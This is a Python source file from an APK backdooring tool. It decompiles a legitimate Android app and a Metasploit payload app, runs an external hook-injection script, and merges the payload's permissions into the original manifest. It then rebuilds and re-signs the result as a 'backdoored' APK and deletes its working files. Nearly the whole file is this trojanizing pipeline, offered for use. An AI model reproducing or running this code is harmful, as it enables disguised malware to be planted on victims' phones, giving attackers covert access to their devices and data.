
#    Copyright (C) <2016>  <M U Suraj>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

# Created by suraj (#r00t)

import os
import re
import time
from core import pycolor
import sys

pyc = pycolor.pyColor()

def decompile(mainapk):

	print pyc.Info("Decompiling apks...")
        os.system("rm -rf $PREFIX/bin/%s"%mainapk)
        os.system("mv %s $PREFIX/bin"%mainapk)
	os.system("apktool d %s -o ~/spade/original"%mainapk)
	os.system("apktool d -f ~/spade/temp.apk -o ~/spade/payload")

def inject(mainapk):
	print pyc.Info("Injecting payload...")

def permissions(mainapk):
        os.system("bash $HOME/spade/Gray.sh")
        print pyc.Succ("Hook injected -> metasploit/stage/Payload")
	print pyc.Info("Agregando permisos...")
        time.sleep(5)
	mainapkname = os.path.splitext(mainapk)[0]
	filemanifest = "payload/AndroidManifest.xml"
	fhandle = open(filemanifest,'r')
	fread = fhandle.readlines()
	prmns = []
	for line in fread:
		if('<uses-permission' in line):
			prmns.append(line.replace('\n',''))	
	fhandle.close()
	filemanifest = "original/AndroidManifest.xml"
	fhandle = open(filemanifest,'r')
	fread = fhandle.readlines()
	half=[]
	for line in fread:
		if('<uses-permission' in line):
			prmns.append(line.replace('\n',''))
		else:
			half.append(line)
	prmns = set(prmns)
	fhandle.close()
	
	fhandle = open(filemanifest,'w')
	for i in half:
		if half.index(i)==2:
			for j in prmns:
				fhandle.write(j+"\n")
		else:
			fhandle.write(i)
	for i in prmns:
		print '\t',i.split('android:name="')[1].split('"')[0]
	print pyc.Succ("%d Permisos agregados.."%(len(prmns)))
        time.sleep(4)

def rebuild(mainapk):
	print pyc.Info("Recompiling...")
        os.system("rm -rf ~/spade/Cesar.apk")
	mainapkname = os.path.splitext(mainapk)[0]
	rebuild = "./apktool b ~/spade/original -o ~/spade/Cesar.apk"

	os.system(rebuild)
        print pyc.Info("jarsigner...")
        os.system("jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA ~/spade/Cesar.apk androiddebugkey > /dev/null 2>&1")
        time.sleep(3)
	print pyc.Info("Signing apk...")
        path = "%s/dist/%s"%(mainapk.split('.')[0],mainapk)
        signapk = "java -jar signapk.jar cert.x509.pem privatekey.pk8 ~/spade/Cesar.apk ~/spade/Gray/%s-final.apk"%mainapkname
        time.sleep(2)
	os.system(signapk) 
        os.system("rm -rf ~/spade/Cesar.apk")
        os.system("rm -rf ~/spade/original")
        os.system("rm -rf ~/spade/'?'")
        os.system("rm -rf ~/spade/payload")
        os.system("rm -rf ~/spade/1.apk")
        os.system("rm -rf ~/spade/temp.apk")
        time.sleep(0.8)
        print pyc.Succ("Successfully backdoored and saved as %s-final.apk"%mainapk[:-4])

